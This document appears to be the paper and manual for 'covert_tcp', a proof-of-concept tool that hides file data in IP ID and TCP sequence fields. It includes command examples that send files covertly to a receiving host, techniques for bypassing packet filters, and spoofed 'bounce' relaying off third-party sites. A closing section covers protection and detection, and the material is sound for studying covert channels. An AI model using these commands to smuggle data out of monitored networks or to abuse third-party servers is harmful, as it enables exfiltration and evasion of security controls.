# Covert-TCP-IP-Protocol
A covert channel is described as: "any communication channel that can be exploited by a process to transfer information in a manner that violates the systems security policy." [1] Essentially, it is a method of communication that is not part of an actual computer system design, but can be used to transfer information to users or system processes that normally would not be allowed access to the information.
In the case of TCP/IP, there are a number of methods available whereby covert channels can be established and data can be surreptitiously passed between hosts. These methods can be used in a variety of areas such as the following:
- Bypassing packet filters, network sniffers, and "dirty word" search engines. - Encapsulating encrypted or non-encrypted information within otherwise normal packets of information for secret transmission through networks that prohibit such activity ("TCP/IP Steganography"). - Concealing locations of transmitted data by "bouncing" forged packets with encapsulated information off innocuous Internet sites.
For the purposes of this paper we will be manipulating the TCP/IP header information in such a way as to encode ASCII values for transmission to outside sources. Other areas of exploration where this information can be contained are varied and include such items as ICMP packets, routing control information, and UDP datagrams. These topics will not be covered in this document although the methods contained herein can be easily adopted to exploit these areas.
The covert_tcp program is a simple utility written for use on Linux systems only and has only been tried on Linux running version 2.0 kernels. Covert_tcp is a proof of concept application that uses raw sockets to construct forged packets and encapsulate data from a filename given on the command line. The file itself can contain text or binary data as the user sees necessary.
The program itself is straightforward and very slow in transmitting of data (about one packet per second). The transfer rate is limited to one packet per second to ensure packets do not arrive out of sync. Because we are subjugating the TCP/IP protocol for a purpose not designed, the normal reliability modes are non- existent and in essence functions much like UDP. This program does not attempt to provide for any type of flow control or error detection, although these things can be added if necessary (this may be overkill). The fastest mode of communication would probably involve establishing of a legitimate data stream between two hosts and encoding the IP identification fields with data. This method would leave the sequence numbers intact and would allow for a drawn out communication session where error correction and flow control are still handled by the IP and TCP layers and the remote system can re-send packets if corrupted with information again imbedded in the header. Lastly, the full length of the fields are not being used, the ID field is 16 bits long and the sequence number fields are 32 bits long, a data compression method can surely be implemented to send larger amounts of data per packet.

The covert_tcp program was made quickly and not much work has been put into making it a functional system and none probably will be. There will be no support for this program of any type.

The program takes a number of parameters which can be used to establish a "client" (the machine sending the data) and a "server" (the machine receiving the data). The options are as follows:

-dest <IP address>

For CLIENT mode [MANDATORY]:

The destination IP address of the server you wish to communicate TO. For the "bounce" mode of operation, this is the server you want to bounce packets off of.

For SERVER mode:

Not Used.

-source <IP address>

For CLIENT mode [MANDATORY]:

The source address you want the packet to appear to be FROM. For the IP ID field and normal TCP sequence number encoding modes this field MUST be your legitimate IP address! Bouncing a packet off of a remote server with encoded IP ID fields will cause the fields to be re-written by the remote server on the return. This is not what you want.

For SERVER mode:

This is the address that the client will listen FOR. If a packet is received from this address it is immediately decoded and written to the output file.

-source_port <port number>

For CLIENT mode:

This is the port that the packet should appear to originate FROM on the source machine. This is normally a random number between 1023-65536. However it can be pre-set to a low port number such as 20 (FTP-Data) or 53 (DNS) to allow it to hop some packet filters that allow this traffic. Additionally, if you are bouncing packets off a remote server, you can set the originating port to a pre- defined number such as 1234 and have your receiving server listening to this port. When the packet bounces off the remote host, it will return on the source IP and port number 1234 where your remote system is listening. In this manner, the client can bounce off hundreds of host and have the server simply write out any data received on port 1234 to a file.

For SERVER mode:

This is the port the local server should be listening to for all data. If you do not supply an IP address, the server will simply write all data received on this port to a file. This allows a client to bounce packets off multiple sites with multiple IP addresses and have the server correctly intercept and decode them.

-dest_port <port number>

For CLIENT mode:

This is the destination port of the server you want to communicate WITH. The default value is port 80 (HTTP) and usually works well. This port does not need to be active on the remote listening server, however the listening server does need to be told to listen for packets for this port or for the IP address you are originating from or bouncing packets from (see -dest option above).

For SERVER mode:

Not used.

-file <filename>

For CLIENT mode [MANDATORY]:

The filename of the file you wish to send. This file can be text or binary and can be encrypted with a program such as PGP to provide further protection. covert_tcp will exit when the file is completely transferred.

For SERVER mode [MANDATORY]:

The name of the file to write to when data is received. End of file is NOT automatically detected in covert_tcp and you will have to ctrl-break to end the data transmission sequence when it is complete.

-server [No options]

For CLIENT mode:

Not used.

For SERVER mode [MANDATORY]:

Tells covert_tcp to listen passively on a raw socket for incoming data. This socket can specifically filter on the source IP given in the command line, or on the port number given, or both. All received data is written to the filename given above.

-ipid

For CLIENT mode:

This is the basic encoding mode which reads in the file given and encodes the ASCII values into the IP identification field before sending the data. This mode does NOT work for the TCP/IP bounce method described above. You MUST use the -seq option to bounce packets off of remote servers. See below for more information on this option.

For SERVER mode:

This tells the server to decode data received based on the IP identification field and write it out to disk to the filename provided.

-seq

For CLIENT mode:

This is another encoding method whereby the TCP sequence numbers are used to encode the ASCII data before sending. This mode can be used along with a spoofed source IP address to bounce packets off of a remote server. This is the only mode that allows you to do this method of data transmission.

For SERVER mode:

This enables the server to decode data stored in the sequence number of incoming packets. This method will ONLY WORK for packets sent DIRECTLY TO THE SERVER and will NOT WORK for packets bounced off a remote site. Remote sites generate their own sequence number if packets are bounced off of them and include this information along with the acknowledged sequence number of the original packet. This mode will not allow the server to decode the ACK field as it should and the data will not be received correctly. See the -ack switch to read BOUNCED packets.

-ack

For CLIENT mode:

Not used.

For SERVER mode:

The ONLY MODE where bounced packets can be decoded. If your client is bouncing packets off a remote site you must use this option to have the server automatically decode the acknowledged sequence numbers of incoming packets.

Examples:

1) Send a file (secret.pgp) via IP Identification field encoding from client_IP to server_IP:

Client sender:

covert_tcp -source client_IP -dest server_IP -file secret.pgp

Server receiver:

covert_tcp -source client_IP -server -file secret.pgp

The IP Identification field is the default encode/decode method so no command switch is necessary. The above sends from a random originating port to a destination port of 80. These are also default values. The server will listen for anything from the client_IP address and write it to disk.

2) Send a file (secret.pgp) via TCP sequence number field encoding appearing to be from port 20 on client_IP destined for port 20 on server_IP:

Client sender:

covert_tcp -source client_IP -dest server_IP -source_port 20 -dest_port 20 - seq -file secret.pgp

Server receiver:

covert_tcp -source_port 20 -server -seq -file secret.pgp

You do not need to include the IP address of the inbound traffic if you do not want. Any traffic destined to port 20 from any site will be written to disk in this case.

3) Send a file (secret.pgp) via TCP sequence number field encoding to be bounced of server bounce_IP and have the packet read by the destination server at server_IP.

Client sender:

covert_tcp -source server_IP -source_port 1234 -dest bounce_IP -seq -file secret.pgp

Server receiver:

covert_tcp -source_port 1234 -server -ack -file secret.pgp

The source packet will appear to have come from server_IP and port 1234. The return packet will go to server_IP port 1234 and will be decoded by the passive server listening for any source IP talking to local port 1234.

NOTE: Covert_tcp will always default to use the supplied listening port number before using the IP address. You need to pick one or the other as the server listening option.

covert_tcp source
#Terminology
It is assumed that the reader is familiar with the basic operation of the TCP/IP protocol suite which includes IP and TCP header field functions and initial connection negotiation. For the uninitiated, a brief description of TCP/IP connection negotiation is given below. The user is strongly encouraged however to research other published literature on the subject.
TCP/IP is comprised of two basic protocol types: TCP and UDP. These protocols have the fundamentally similar function of passing user data, however they differ significantly in how the initial connection between hosts are established.
For our purposes, it is important to realize that TCP is a "connection oriented" or "reliable" protocol. Simply put, TCP has certain features that ensure data arrives at the remote host in a (usually) intact manner. The basic operation of this relies in the initial TCP "three way handshake" which is described in the three steps below.

Step One: Send a synchronize (SYN) packet and Initial Sequence Number (ISN)

Host A wishes to establish a connection to Host B. Host A sends a solitary packet to Host B with the synchronize bit (SYN) set announcing the new connection and an Initial Sequence Number(ISN) which will allow tracking of packets sent between hosts:

Host A ------ SYN(ISN) ------> Host B

Step Two: Allow remote host to respond with an acknowledgment (ACK)

Host B responds to the request by sending a packet with the synchronize bit set (SYN) and ACK (acknowledgment) bit set in the packet back to the calling host. This packet contains not only the responding clients' own sequence number, but the Initial Sequence Number plus one (ISN+1) to indicate the remote packet was correctly received as part of the acknowledgment and is awaiting the next transmission:

Host A <------ SYN(ISN+1)/ACK ------ Host B

Step Three: Complete negotiation by sending a final acknowledgment to the remote host.

At this point Host A sends back a final ACK packet and sequence number to indicate successful reception and the connection is complete and data can now flow:

Host A ------ ACK ------> Host B

The entire connection process happens in a matter of milliseconds and each packet from this point on is independently acknowledged by both sides. This handshake method ensures a "reliable" connection between hosts and is why TCP is considered a "connection oriented" protocol. It should be noted that only TCP packets exhibit this negotiation process. This is not so with UDP packets which are considered "unreliable" and do not attempt to correct errors nor negotiate a connection before sending to a remote host. This paper deals with the TCP protocol primarily to exploit the acknowledgment feature which will be described below. The thrust of these methods however, could be easily supported on the UDP protocol type.
#Encoding Information in a TCP/IP Header
The TCP/IP header contains a number of areas where information can be stored and sent to a remote host in a covert manner. Take the following diagrams[2] which are textual representations of the IP and TCP headers respectively:
IP Header (Numbers represent bits of data from 0 to 32 and the relative position of the fields in the datagram)

0           4              8          16     19         24            32

------------------------------------------------------------------------

|  VERS  |   HLEN |    Service Type   |          Total Length          |

------------------------------------------------------------------------

|         Identification              | Flags |       Fragment Offset  |

------------------------------------------------------------------------

|                             Source IP Address                        |

------------------------------------------------------------------------

|                         Destination IP Address                       |

------------------------------------------------------------------------

|                                 IP Options             |  Padding    |

------------------------------------------------------------------------

|                                    Data                              |

------------------------------------------------------------------------
TCP Header (Numbers represent bits of data from 0 to 32 and the relative position of the fields in the datagram)



0           4              8           16     19    24                 32

-------------------------------------------------------------------------

|              Source Port             |         Destination Port       |

-------------------------------------------------------------------------

|                               Sequence Number                         |

-------------------------------------------------------------------------

|                             Acknowledgment Number                     |

-------------------------------------------------------------------------

| HLEN  |  Reserved |   Code Bits     |         Window                  |

-------------------------------------------------------------------------

|              Checksum               |         Urgent Pointer          |

-------------------------------------------------------------------------

|                                   Options    |        Padding         |

-------------------------------------------------------------------------

|                                    Data                               |

-------------------------------------------------------------------------
Within each header there are multitude of areas that are not used for normal transmission or are "optional" fields to be set as needed by the sender of the datagrams. An analysis of the areas of a typical IP header that are either unused or optional reveals many possibilities where data can be stored and transmitted. For our purposes, we will focus on encapsulation of data in the more mandatory fields. This is not because they are any better than the other optional areas. Rather these fields are not as likely to be altered in transit than say the IP or TCP options fields which are sometimes changed or stripped off by packet filtering mechanisms or through fragment re-assembly.

Therefore we will encode and decode the following:

- The IP packet identification field. 
- The TCP initial sequence number field.
- The TCP acknowledged sequence number field.

The basis of the exploitation relies in encoding ASCII values of the range 0-255 into the above areas. Using this method it is possible to pass data between hosts in packets that appear to be initial connection requests, established data streams, or other intermediate steps. These packets can contain no actual data, or can contain data designed to look innocent. These packets can also contain forged source and destination IP addresses as well as forged source and destination ports. This can be useful for tunneling information past some types of packet filters. Additionally, forged packets can be used to initiate an anonymous TCP/IP "bounced packet network" whereby packets between systems can be relayed off legitimate sites to thwart tracking by sniffers and other network monitoring devices. These techniques will be described below.
#Method One: Manipulation of the IP Identification Field
The identification field of the IP protocol helps with re-assembly of packet data by remote routers and host systems. It's purpose is to give a unique value to packets so if fragmentation occurs along a route, they can be accurately re- assembled[2]. The first encoding method simply replaces the IP identification field with the numerical ASCII representation of the character to be encoded. This allows for easy transmission to a remote host which simply reads the IP identification field and translates the encoded ASCII value to its printable counterpart. The lines below show a tcpdump(8) representation of the packets on a network between two hosts "nemesis.psionic.com" and "blast.psionic.com." A coded message consisting of the letters "HELLO" was sent between the two hosts in packets appearing to be destined for the WWW server on blast.psionic.com. The actual packet data does not matter.
The field in question is the IP portion of the packet called the "id" field located in the parenthesis. Note that the ID field is represented by an unsigned integer during the packet generation process of the included program. This program does not perform any type of byte ordering functions normally used in this process, therefore packet data is converted to the ASCII equivalent by dividing by 256.

Packet One:

18:50:13.551117 nemesis.psionic.com.7180 > blast.psionic.com.www: S 537657344:537657344(0) win 512 (ttl 64, id 18432)

Decoding:...(ttl 64, id 18432/256) [ASCII: 72(H)]

Packet Two:

18:50:14.551117 nemesis.psionic.com.51727 > blast.psionic.com.www: S1393295360:1393295360(0) win 512 (ttl 64, id 17664)

Decoding:...(ttl 64, id 17664/256) [ASCII: 69(E)]

Packet Three:

18:50:15.551117 nemesis.psionic.com.9473 > blast.psionic.com.www: S 3994419200:3994419200(0) win 512 (ttl 64, id 19456)

Decoding:...(ttl 64, id 19456/256) [ASCII: 76(L)]

Packet Four:

18:50:16.551117 nemesis.psionic.com.56855 > blast.psionic.com.www: S3676635136:3676635136(0) win 512 (ttl 64, id 19456)

Decoding:...(ttl 64, id 19456/256) [ASCII: 76(L)]

Packet Five:

18:50:17.551117 nemesis.psionic.com.1280 > blast.psionic.com.www: S 774242304:774242304(0) win 512 (ttl 64, id 20224)

Decoding:...(ttl 64, id 20224/256) [ASCII: 79(O)]

Packet Six:

18:50:18.551117 nemesis.psionic.com.21004 > blast.psionic.com.www: S3843751936:3843751936(0) win 512 (ttl 64, id 2560)

Decoding:...(ttl 64, id 2560/256) [ASCII: 10(Carriage Return)]

This method is used by having the client host construct a packet with the appropriate destination host and source host information and encoded IP ID field. This packet is sent to the remote host which is listening on a passive socket which decodes the data.

This method is relatively straightforward and easy to implement as shown in the included program: covert_tcp. The reader should note that this method relies on manipulation of the IP header information, and may be more susceptible to packet filtering and network address translation where the header information may re-written in transit especially if located behind a firewall. If this happens, loss of the encoded data may occur.
#Method Two: Initial Sequence Number Field
The Initial Sequence Number field (ISN) of the TCP/IP protocol suite enables a client to establish a reliable protocol negotiation with a remote server. As part of the negotiation process for TCP/IP, several steps are taken in what is commonly called a "three way handshake" as was described earlier. For our purposes the sequence number field serves as a perfect medium for transmitting clandestine data because of it's size (a 32 bit number). In this light, there are a number of possible methods to use. The simplest is to generate the sequence number from our actual ASCII character we wish to have encoded. This is the method used by covert_tcp as shown in the following packets (The "S" indicates a synchronize packet with the 10 digit number following being the sequence number being sent). Again, no byte ordering functions are used by covert_tcp to generate the sequence numbers. This enables a more "realistic" looking sequence number. Therefore in our example the sequence numbers are converted to ASCII by dividing by 16777216 which is a representation of 65536*256.
Again our message of HELLO is being sent:

Packet One:

18:50:29.071117 nemesis.psionic.com.45321 > blast.psionic.com.www: S 1207959552:1207959552(0) win 512 (ttl 64, id 49408)

Decoding:... S 1207959552/16777216 [ASCII: 72(H)]

Packet Two:

18:50:30.071117 nemesis.psionic.com.65292 > blast.psionic.com.www: S 1157627904:1157627904(0) win 512 (ttl 64, id 47616)

Decoding:... S 1157627904/16777216 [ASCII: 69(E)]

Packet Three:

18:50:31.071117 nemesis.psionic.com.25120 > blast.psionic.com.www: S 1275068416:1275068416(0) win 512 (ttl 64, id 41984)

Decoding:... S 1275068416/16777216 [ASCII: 76(L)]

Packet Four:

18:50:32.071117 nemesis.psionic.com.13603 > blast.psionic.com.www: S 1275068416:1275068416(0) win 512 (ttl 64, id 7936)

Decoding:... S 1275068416/16777216 [ASCII: 76(L)]

Packet Five:

18:50:33.071117 nemesis.psionic.com.45830 > blast.psionic.com.www: S 1325400064:1325400064(0) win 512 (ttl 64, id 3072)

Decoding:... S 1325400064/16777216 [ASCII: 79(O)]

Packet Six:

18:50:34.071117 nemesis.psionic.com.64535 > blast.psionic.com.www: S 167772160:167772160(0) win 512 (ttl 64, id 54528)

Decoding:... S 167772160/16777216 [ASCII: 10(Carriage Return)]

Using this method, the packet is constructed with the appropriate data in the SYN field and sent to the destination host. The destination host, expecting to receive information from the client, simply grabs the SYN field of each incoming packet to reconstruct the encoded data. This is done with a passive listening socket on the remote end as described earlier.

Because of the sheer amount of information one can represent in a 32 bit address space (4,294,967,296 numbers), the sequence number makes an ideal location for storing data. Aside from the obvious example given above, one can use a number of other techniques to store information in either a byte fashion, or as bits of information represented through careful manipulation of the sequence number. The simple algorithm of the covert_tcp program takes the ASCII value of our data and converts it to a usable sequence number (which is actually done by the packet generation functions and is converted back to ASCII in a symmetrical manner). Note that this method (as well as the other methods in this paper) are similar to a "substitution cipher" whereby packets containing the same information will display the same sequence number (note packets three and four which contain the letter "L" in the encoding and their sequence numbers). Methods that incorporate a random number generation of the sequence number with a subsequent inclusion of the data to be encoded through an XOR or similar operation may yield a more random result. Inclusion of encrypted data to perform the same function is a logical extension to this idea.
#Method Three: The TCP Acknowledge Sequence Number Field "Bounce"
This method relies upon basic spoofing of IP addresses to enable a sending machine to "bounce" a packet of information off of a remote site and have that site return the packet to the real destination address. This has the benefit of concealing the sender of the packet as it appears to come from the "bounce" host. This method could be used to set up an anonymous one-way communication network that would be difficult to detect especially if the bounce server is very busy.
This method relies on the characteristic of TCP/IP where the destination server responds to an initial connect request (SYN packet) with a SYN/ACK packet containing the original initial sequence number plus one (ISN+1). In this method, the sender constructs a packet that contains the following information:

- Forged SOURCE IP address.
- Forged SOURCE port.
- Forged DESTINATION IP address.
- Forged DESTINATION port.
- TCP SYN number with encoded data.

The source and destination ports chosen do not matter (except if you want to conceal the traffic as a well known service such as HTTP and/or you are having the receiving server listening for data on a pre-determined port, in which case you will want to forge the source port as well). The DESTINATION IP address should be the server you wish to BOUNCE information off of and the SOURCE IP should be the address of the server you wish to communicate WITH.
The packet is sent from the client's computer system and routed to the forged destination IP address in the header ("bounce server"). The bounce server receives the packet and sends either a SYN/ACK or a SYN/RST depending on the state of the port the packet was destined for on the bounce server. The return packet is sent to the forged source address with the ISN number plus one. The listening destination server takes this incoming packet and decodes the information by transforming the returned sequence number minus one back into the ASCII equivalent. It should be noted that the low order bits are dropped in the translation process of covert_tcp because of the method used to "encode" and "decode" information, so the program does not need to adjust for the incremented SYN packet number.

A step-by-step representation of the bounce method:

- Sending Client: A
- Bounce Server: B
- Receiving Server: C

Step One: Client A sends a forged packet with encoded information to bounce server B. This packet has the address of receiving server C.

Step Two: Bounce server B receives the packet and returns an appropriate SYN/ACK or SYN/RST packet based on the status of the port. Since bounce server B thinks the packet came from receiving server C, the packet is sent to address of receiving server C. The acknowledgment sequence number (which is the encoded sequence number plus one) is sent to server C as well.

Step Three: Server C, expecting to receive a packet from the bounce server B (or a pre-determined port) decodes the data and writes it out to disk.

This method is essentially tricking the remote server into sending the packet and encapsulated data back to the forged source IP address, which it rightfully thinks is legitimate. From the receiving end, the packet appears to originate from the bounced server, and indeed it does. As a side note, if the receiving system is behind a packet filter that only allows communication to certain sites, this method can be used to bounce packets off of the trusted sites which will then relay them to the system behind the packet filter with a legitimate source address. This could be vital in communicating with receiving servers in heavily protected or scrutinized networks.

Bouncing a packet off of a well known Internet site (.mil, .gov, .com, etc.) is also a useful technique for concealing operations in ordinary traffic. Be sure the bounce site is not using round-robin DNS (stable IP address) or if it is, that the receiving server is passively listening on a pre-determined port to decode the transmissions from multiple sites (i.e. send out a forged source address and source port of 1234 so the bounce server returns the packet to the listening server on port 1234). Using this technique, the sending client can bounce packets off of hundreds of Internet hosts while the receiving server listens and writes out any data destined for the pre-defined port number regardless of IP address.

If your network site has a correctly configured router, it may not allow a forged packet with a network number that is not from it's network to traverse outbound. Alas, many routers are not configured with this protection in mind and will happily pass the data so you can generally expect this technique to work.
#Implications, Protection, and Detection
The implications of these methods depend on the purposes they are being used for. Immediate use could allow for an encrypted and concealed communication channel between hosts located in countries that may frown upon the use of cryptography (France, China, and others). Additional purposes could be served in the areas of data smuggling and anonymous communication.
Protection from these techniques include the use of an application proxy firewall system which is not allowing packets from logically separated networks to pass directly to each other. I know of no other firewall type that can guarantee this. A packet-filter "firewall" MAY stop the traffic depending if true network address translation is used (re-writing of the ENTIRE TCP/IP header information), which is often not the case despite what advertisers may say.

Additionally, if you are bouncing the packets off a remote site with a listening port, the return packet will have a SYN/ACK combination set in the header and will look like an "established" connection to the packet filter. This has the potential to punch through many of these filters, even some that claim to be "stateful". A straight packet filter in the form of a router will probably offer little or no protection, especially if you allow any "establishedi" traffic back in from any site, which is almost a certainty.

Detection of these techniques can be difficult, especially if the information being passed in the packet data is encrypted with a good software package (PGP and others). Particularly, hosts receiving a server bounced packet will have a difficult time determining from where the packet originated unless they can put a sniffer on the inbound side of the bounced server, which will still only reveal that a forged packet originated from somewhere on the Internet. Methods to track down the packet can still be used at this point however, so caution should be used (assuming anyone notices it occurring).
